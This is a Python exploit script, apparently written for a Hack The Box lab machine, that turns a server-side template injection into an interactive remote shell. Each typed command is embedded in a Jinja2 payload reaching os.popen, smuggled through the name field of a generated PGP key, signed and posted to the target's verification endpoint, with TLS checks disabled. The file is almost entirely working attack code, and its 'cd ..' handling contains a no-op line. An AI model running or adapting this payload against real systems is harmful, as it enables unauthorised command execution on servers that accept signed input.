#!/usr/bin/python3

import sys
import gnupg
import requests
import html

requests.packages.urllib3.disable_warnings()

def generate_pgp_keys(name, email):
    gpg = gnupg.GPG()

    input_data = gpg.gen_key_input(
        key_type="RSA",
        key_length=2048,
        name_real=name,
        name_email=email,
		    no_protection=True
    )

    key = gpg.gen_key(input_data)
    public_key = gpg.export_keys(key.fingerprint)

    return key, public_key

def sign_message(message, key):
    gpg = gnupg.GPG()

    signed_message = gpg.sign(message, keyid=key.fingerprint)
    
    return signed_message

def verify_signed_message(public_key, signed_message):

    response = requests.post(
		url  = 'https://ssa.htb/process',
		data = {
			'signed_text': signed_message,
			'public_key': public_key
		},
		verify=False
	  )

    print(html.unescape(response.text.split("\"")[1].replace("<amogus@imposter.sus>","")))

def main():

	cwd = '/var/www/html/SSA/'

	while True:
		try:
			command = input('$ ')

			if command == 'll':
				command = 'ls -alhF'
			if 'cd' in command:
				if '..' in command:
					'/'.join(cwd.split('/')[:len(cwd.split('/'))-2])
				if not '/' in command:
					cwd += '/' + command.split(' ')[1]
				else:
					cwd = command.split(' ')[1]

			payload = f'cd {cwd};{command}' 
    
			real_name = '{{' + f"self.__init__.__globals__.__builtins__.__import__('os').popen('{payload}').read()" + '}}'
			email = 'amogus@imposter.sus'
    
			key, public_key = generate_pgp_keys(real_name, email)
    
			message = 'AMOGUS!'
			signed_message = sign_message(message, key)

			verify_signed_message(public_key, signed_message)

		except KeyboardInterrupt:
			sys.exit(0)

if __name__ == '__main__':
    main()
